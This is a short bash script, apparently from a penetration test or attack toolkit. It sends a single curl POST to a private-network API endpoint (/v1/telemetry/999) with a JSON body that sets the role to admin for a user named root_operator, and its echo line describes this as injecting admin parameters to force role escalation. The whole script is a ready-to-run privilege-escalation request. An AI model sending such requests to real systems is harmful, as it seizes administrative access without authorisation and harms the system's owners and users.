#!/bin/bash
echo "[*] Injecting admin parameters to force role escalation..."
curl --connect-timeout 3 --max-time 3 --max-time 3 -i -X POST \
  -H "Content-Type: application/json" \
  -d '{"role": "admin", "user": "root_operator"}' \
  http://192.168.1.168:30085/v1/telemetry/999
